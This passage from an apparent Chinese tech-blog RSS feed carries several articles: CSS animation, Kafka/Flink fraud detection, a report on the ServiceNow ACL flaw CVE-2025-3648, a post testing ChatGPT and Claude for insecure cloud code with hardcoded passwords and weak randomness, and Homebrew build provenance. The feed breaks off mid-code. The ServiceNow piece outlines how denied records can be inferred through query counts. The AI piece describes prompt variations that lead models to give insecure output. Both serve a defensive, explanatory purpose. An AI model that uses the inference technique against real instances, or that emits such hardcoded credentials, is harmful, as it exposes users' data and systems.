&lt;p&gt;在为Mike Worth设计的404页面中，当用户迷路时，他的吉祥物会慢慢陷入流沙，同时气泡上升，创造出一个既有趣又能反映品牌个性的体验。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;keyframes&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;four-oh-dear-bubbles&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;animation-timing-function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;ease-in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;opacity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;translateY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;animation-timing-function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;ease-out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;opacity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;translate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;无障碍考虑&#34;&gt;无障碍考虑
&lt;/h2&gt;&lt;p&gt;不是所有人都以相同方式体验动画。有些人可能会感到不适甚至诱发癫痫。我们可以通过prefers-reduced-motion媒体查询来关闭动画：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;media&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;prefers-reduced-motion&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;reduce&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;animation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;none&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;!important&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;就像汉纳-巴伯拉的动画师将技术限制转化为他们的标志性风格一样，CSS动画让网页专业人士能够打造富有特色的体验。通过分层元素、循环帧和应用细微运动，你可以在设计中注入个性，同时提升用户体验。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>基于Kafka和Flink的移动出行服务实时欺诈检测技术解析</title>
        <link>http://localhost:1313/p/%E5%9F%BA%E4%BA%8Ekafka%E5%92%8Cflink%E7%9A%84%E7%A7%BB%E5%8A%A8%E5%87%BA%E8%A1%8C%E6%9C%8D%E5%8A%A1%E5%AE%9E%E6%97%B6%E6%AC%BA%E8%AF%88%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 06:05:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9F%BA%E4%BA%8Ekafka%E5%92%8Cflink%E7%9A%84%E7%A7%BB%E5%8A%A8%E5%87%BA%E8%A1%8C%E6%9C%8D%E5%8A%A1%E5%AE%9E%E6%97%B6%E6%AC%BA%E8%AF%88%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;移动出行服务中的实时欺诈检测kafka与flink技术实践&#34;&gt;移动出行服务中的实时欺诈检测：Kafka与Flink技术实践
&lt;/h1&gt;&lt;p&gt;移动出行服务（如Uber、Grab、FREE NOW和DoorDash）建立在实时数据基础之上。每次行程、配送和支付都依赖精准的即时决策。但随着业务规模扩大，这些服务成为复杂欺诈的主要目标——GPS欺骗、虚假账户、支付滥用等。传统的批量欺诈检测方式因响应延迟、模式识别不足会产生安全盲区。领先平台正在采用Apache Kafka和Apache Flink构建实时事件处理系统，在欺诈发生瞬间进行拦截。&lt;/p&gt;
&lt;h2 id=&#34;移动出行服务的商业挑战&#34;&gt;移动出行服务的商业挑战
&lt;/h2&gt;&lt;p&gt;现代城市生活中，网约车、外卖配送、共享单车等移动服务已成为基础设施。这些平台连接数百万用户、司机和商户，但同时也面临以下典型欺诈：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;虚假行程与GPS欺骗&lt;/strong&gt;：司机伪造GPS数据模拟未发生的行程&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;支付欺诈与盗刷信用卡&lt;/strong&gt;：使用盗取的支付方式叫车/订餐&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;虚假司机/乘客账户&lt;/strong&gt;：同一人操控多账户套取平台补贴&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;促销滥用&lt;/strong&gt;：通过海量虚假账号薅取推荐奖励&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;账户劫持&lt;/strong&gt;：黑客盗用合法账户的支付信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;传统反欺诈系统的局限性&#34;&gt;传统反欺诈系统的局限性
&lt;/h2&gt;&lt;p&gt;基于批处理和规则引擎的传统方案存在四大缺陷：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;无法实现交易前的实时拦截&lt;/li&gt;
&lt;li&gt;难以处理每秒百万级的事件吞吐&lt;/li&gt;
&lt;li&gt;静态规则难以应对快速演变的欺诈模式&lt;/li&gt;
&lt;li&gt;难以跨混合云环境部署&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;kafkaflink实时反欺诈架构&#34;&gt;Kafka+Flink实时反欺诈架构
&lt;/h2&gt;&lt;h3 id=&#34;apache-kafka事件流处理核心&#34;&gt;Apache Kafka：事件流处理核心
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;实时采集GPS定位、支付交易、用户行为等数据&lt;/li&gt;
&lt;li&gt;支持每秒百万事件处理能力&lt;/li&gt;
&lt;li&gt;提供跨云环境的24/7高可用服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;apache-flink实时流分析引擎&#34;&gt;Apache Flink：实时流分析引擎
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;异常检测&lt;/strong&gt;：识别GPS轨迹突变等空间异常&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多流关联&lt;/strong&gt;：实时聚合支付事件、位置更新等数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;在线机器学习&lt;/strong&gt;：动态更新欺诈识别模型&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;毫秒级评分&lt;/strong&gt;：在交易完成前生成风险评分&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;行业实践案例&#34;&gt;行业实践案例
&lt;/h2&gt;&lt;h3 id=&#34;free-nowlyft实时行程欺诈检测&#34;&gt;FREE NOW（Lyft）实时行程欺诈检测
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;使用Kafka Streams分析150+欧洲城市的GPS数据&lt;/li&gt;
&lt;li&gt;通过路线异常识别虚假行程&lt;/li&gt;
&lt;li&gt;在Confluent Cloud上实现全托管流处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;grabdefence反欺诈系统&#34;&gt;GrabDefence反欺诈系统
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;基于Kafka+Flink的实时风险评分&lt;/li&gt;
&lt;li&gt;设备指纹+支付行为多维分析&lt;/li&gt;
&lt;li&gt;将欺诈率从1.6%降至0.2%&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;uber-radar项目&#34;&gt;Uber RADAR项目
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Kafka+Spark混合处理架构&lt;/li&gt;
&lt;li&gt;机器学习识别拒付欺诈&lt;/li&gt;
&lt;li&gt;引入人工审核闭环机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术实施关键点&#34;&gt;技术实施关键点
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;事件时间处理&lt;/strong&gt;：正确处理乱序到达的移动端事件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;状态管理&lt;/strong&gt;：维护用户行为基线用于异常比对&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模型部署&lt;/strong&gt;：TensorFlow/PyTorch模型嵌入Flink流水线&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态规则更新&lt;/strong&gt;：通过Kafka主题实时推送新规则&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实时反欺诈已成为移动出行平台的核心竞争力。通过Kafka和Flink构建的流式处理架构，企业能够在损失发生前拦截99%的欺诈行为，同时将运营成本降低40%以上。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ServiceNow管理员注意：立即修复访问控制列表漏洞</title>
        <link>http://localhost:1313/p/servicenow%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E6%84%8F%E7%AB%8B%E5%8D%B3%E4%BF%AE%E5%A4%8D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sat, 02 Aug 2025 05:44:03 +0800</pubDate>
        
        <guid>http://localhost:1313/p/servicenow%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E6%84%8F%E7%AB%8B%E5%8D%B3%E4%BF%AE%E5%A4%8D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;warning-to-servicenow-admins-fix-your-access-control-lists-now&#34;&gt;Warning to ServiceNow admins: Fix your access control lists now
&lt;/h1&gt;&lt;p&gt;安全厂商警告称，ServiceNow管理用户访问控制列表(ACL)的方式存在漏洞，攻击者可轻松窃取敏感数据。研究人员敦促管理员立即检查自定义和标准数据配置表以加强安全防护。&lt;/p&gt;
&lt;p&gt;Varonis研究人员一年前就向ServiceNow报告了这个漏洞，使其能够悄悄修补平台并在5月向客户发布安全更新。随着ServiceNow本周发布通用漏洞披露(CVE-2025-3648)，Varonis公开了漏洞细节。&lt;/p&gt;
&lt;p&gt;IDC总裁Crawford Del Prete表示：&amp;ldquo;ServiceNow的更新修复了可能允许低权限用户访问受限数据的漏洞。考虑到ServiceNow处理的数据类型，这种情况总是可能很严重。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Forrester Research企业架构首席分析师Charles Betz称这是&amp;quot;相当严重的漏洞&amp;quot;，敦促管理员&amp;quot;立即采取行动&amp;quot;。他指出：&amp;ldquo;随着CVE公开，攻击者很可能开始针对这些数据。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;漏洞技术细节&#34;&gt;漏洞技术细节
&lt;/h2&gt;&lt;p&gt;该访问控制漏洞允许未经认证或已认证用户在某些条件下通过查询请求访问未授权数据。Varonis安全研究经理Yogev Madar指出，攻击者可以利用以下方式实施攻击：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅依赖数据或脚本条件的ACL可能被滥用&lt;/li&gt;
&lt;li&gt;未使用新的&amp;quot;Deny else&amp;quot;ACL机制&lt;/li&gt;
&lt;li&gt;未应用Query ACL规则限制查询操作符&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ServiceNow已在Xanadu和Yokohama平台版本中引入额外的访问控制列表框架。Varonis在博客中表示：&amp;ldquo;该漏洞相对容易利用，只需要最小的表访问权限，如实例中的弱用户账户甚至自注册匿名用户。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;数据存储架构风险&#34;&gt;数据存储架构风险
&lt;/h2&gt;&lt;p&gt;ServiceNow将所有信息组织到表中，包括事件、请求、实例属性、用户数据、应用凭证等。这些表通过引用字段相互关联，而访问主要通过ACL规则控制。一个ServiceNow实例可能包含数万个ACL规则。&lt;/p&gt;
&lt;p&gt;ACL规则包含四个访问条件，按以下顺序评估：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;必需角色&lt;/li&gt;
&lt;li&gt;安全属性条件&lt;/li&gt;
&lt;li&gt;数据条件&lt;/li&gt;
&lt;li&gt;脚本条件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Varonis发现，如果访问因前两个条件被拒绝，系统会完全拒绝访问；但如果因数据或脚本条件被拒，用户仍能看到查询返回的记录总数，攻击者可利用查询参数通过枚举推断详细数据。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;ServiceNow提供了新的ACL规则供管理员实施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Query ACL：限制用户可执行的查询&lt;/li&gt;
&lt;li&gt;新的安全数据过滤器：基于角色或安全属性限制记录访问&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Reco首席产品官Gal Nakash强调：&amp;ldquo;这提醒我们即使成熟平台在访问控制方面也可能存在危险盲点。组织必须采用&amp;rsquo;最小权限&amp;rsquo;原则配置ACL，绝不能让角色和安全属性留空或过于宽泛。&amp;rdquo;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>错误但快速的云基础设施配置方式 - 安全风险警示</title>
        <link>http://localhost:1313/p/%E9%94%99%E8%AF%AF%E4%BD%86%E5%BF%AB%E9%80%9F%E7%9A%84%E4%BA%91%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AD%A6%E7%A4%BA/</link>
        <pubDate>Sat, 02 Aug 2025 05:27:39 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%94%99%E8%AF%AF%E4%BD%86%E5%BF%AB%E9%80%9F%E7%9A%84%E4%BA%91%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AD%A6%E7%A4%BA/</guid>
        <description>&lt;p&gt;今天我们将以&amp;quot;Max Power&amp;quot;方式配置云基础设施：将自动化与未经检查的AI输出相结合。不幸的是，这种方法产生的云基础设施代码虽然能用，但具有可怕的安全特性。&lt;/p&gt;
&lt;p&gt;简而言之，像Claude和ChatGPT这样的AI工具会轻易提供极其糟糕的云基础设施配置代码，比如使用常见硬编码密码的代码。这些工具还会&amp;quot;热心&amp;quot;地建议你使用&amp;quot;随机&amp;quot;密码，但由于LLM生成输出的本质，这些密码根本谈不上随机。即使你试图聪明地要求这些工具提供密码生成代码，这些代码也充满严重的安全漏洞。&lt;/p&gt;
&lt;p&gt;显然，不要盲目信任AI工具的输出。云服务提供商应该努力识别本文中提到的不良模式（和硬编码凭证），并在基础设施层进行拦截（就像他们在GitHub提交API密钥时做的那样）。LLM供应商应该考虑让生成存在明显安全问题的云基础设施代码变得不那么容易。&lt;/p&gt;
&lt;h3 id=&#34;创建一个windows-vm&#34;&gt;创建一个Windows VM
&lt;/h3&gt;&lt;p&gt;假设你是云开发新手。你想在Microsoft Azure上用Terraform创建一个Windows VM，并通过RDP连接到机器。（我们使用Azure作为示例只是因为这是我需要使用的提供商，但基本问题适用于所有云提供商）。&lt;/p&gt;
&lt;p&gt;让我们问问ChatGPT 4o和Claude应该怎么做。&lt;/p&gt;
&lt;p&gt;以下是ChatGPT的回答：
[示例对话内容&amp;hellip;]&lt;/p&gt;
&lt;p&gt;Claude至少提醒你更改admin_password。这些都是硬编码凭证，使用它们很糟糕。是的，Claude要求你更改它们，但有多少人真的会这么做？应该相当容易设计正确的提示并提取出ChatGPT或Claude会输出的所有（技术上，几乎所有）凭证。&lt;/p&gt;
&lt;h3 id=&#34;要求更好的凭证&#34;&gt;要求更好的凭证
&lt;/h3&gt;&lt;p&gt;我们都知道硬编码凭证不好。如果我们要求一些更好的呢？&lt;/p&gt;
&lt;p&gt;我们从ChatGPT开始：
[示例对话内容显示生成的&amp;quot;随机&amp;quot;密码实际上并不随机&amp;hellip;]&lt;/p&gt;
&lt;p&gt;接下来试试Claude。起初它给出了正确的答案。但当被稍微不同地询问时，Claude很快就放弃了。&lt;/p&gt;
&lt;h3 id=&#34;关于密码生成&#34;&gt;关于密码生成
&lt;/h3&gt;&lt;p&gt;也许我们可以要求这些工具编写生成密码的代码。事实上，我需要完成的部分任务涉及创建多个Azure AD账户，这似乎是个合乎逻辑的方法。看看我们的AI工具在自动生成账户凭证方面表现如何。&lt;/p&gt;
&lt;p&gt;以下是ChatGPT的解决方案：
[展示有安全缺陷的Python随机模块代码&amp;hellip;]&lt;/p&gt;
&lt;p&gt;Claude的解决方案：
[同样展示不安全的伪随机生成代码&amp;hellip;]&lt;/p&gt;
&lt;p&gt;这两个解决方案都非常具有欺骗性，因为它们看起来正确但实际上错得离谱。它们会生成&amp;quot;看起来&amp;quot;随机的密码，但存在缺陷：Python的random模块不是安全的随机数据源。它是一个用当前系统时间作为种子的伪随机生成器。很容易就能生成这个脚本在过去一年或更长时间内可能生成的所有密码。它提供的密码不应该用于任何用途，也许除了临时测试。正确的做法是使用Python的secrets模块。&lt;/p&gt;
&lt;h3 id=&#34;可以采取的措施&#34;&gt;可以采取的措施
&lt;/h3&gt;&lt;p&gt;毫无疑问，这个兔子洞很深。这里的回应只是我在几天内尝试自动化Terraform工作流程时遇到的。可悲的是，最不可能理解硬编码凭证和弱随机值影响的人，也最有可能直接复制粘贴AI工具的原始输出。&lt;/p&gt;
&lt;p&gt;云提供商应该假设人们已经在复制粘贴ChatGPT和Claude的输出，并应该努力拦截常见的硬编码凭证和其他不良基础设施模式。&lt;/p&gt;
&lt;p&gt;LLM供应商应该让用户更难意外地伤害自己。不应该是完全不可能出现这种行为，但绝对不应该是默认行为。&lt;/p&gt;
&lt;p&gt;一如既往，云基础设施很复杂；如果你真的想增强安全性，考虑让我们进行基础设施威胁模型评估，这将识别弱点和潜在攻击路径，并提出解决方法。在你庞大的自动化基础设施部署中，潜伏着比硬编码凭证和弱随机性更多的问题。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Homebrew构建溯源技术解析：提升软件供应链安全</title>
        <link>http://localhost:1313/p/homebrew%E6%9E%84%E5%BB%BA%E6%BA%AF%E6%BA%90%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E6%8F%90%E5%8D%87%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/</link>
        <pubDate>Sat, 02 Aug 2025 05:11:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/homebrew%E6%9E%84%E5%BB%BA%E6%BA%AF%E6%BA%90%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E6%8F%90%E5%8D%87%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/</guid>
        <description>&lt;h3 id=&#34;homebrew构建溯源初探&#34;&gt;Homebrew构建溯源初探
&lt;/h3&gt;&lt;p&gt;去年11月，我们宣布与Alpha-Omega、OpenSSF合作，为Homebrew添加构建溯源功能。现在，我们很高兴地宣布核心功能已进入公测阶段：homebrew-core现对所有官方CI构建的bottle（预编译二进制包）提供密码学证明。用户可通过我们开发的&lt;code&gt;brew verify&lt;/code&gt;命令（当前为第三方插件，即将合并到上游）进行验证：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew tap trailofbits/homebrew-brew-verify
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew verify &amp;lt;package&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;技术实现原理&#34;&gt;技术实现原理
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;构建身份绑定&lt;/strong&gt;&lt;br&gt;
每个bottle现在附带可验证的声明，将其内容与构建工作流元数据（包括Git提交哈希、GitHub Actions运行ID等）进行密码学绑定，形成符合SLSA Build L2标准的证明。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;防御供应链攻击&lt;/strong&gt;&lt;br&gt;
该机制可防止两种威胁场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击者直接上传恶意构建到bottle存储库&lt;/li&gt;
&lt;li&gt;维护者同时替换bottle及其校验值的&amp;quot;沉默攻击&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;历史包回填方案&lt;/strong&gt;&lt;br&gt;
针对旧版本bottle的兼容性问题，我们创新性地采用双验证策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优先检查主仓库（Homebrew/homebrew-core）的正式构建证明&lt;/li&gt;
&lt;li&gt;若不存在，则检查由trailofbits/homebrew-brew-verify提供的回填签名&lt;/li&gt;
&lt;li&gt;设置截止日期防止签名滥用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;验证工具使用&#34;&gt;验证工具使用
&lt;/h3&gt;&lt;p&gt;当前提供两种实验性验证方式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 方式1：独立验证命令&lt;/span&gt;
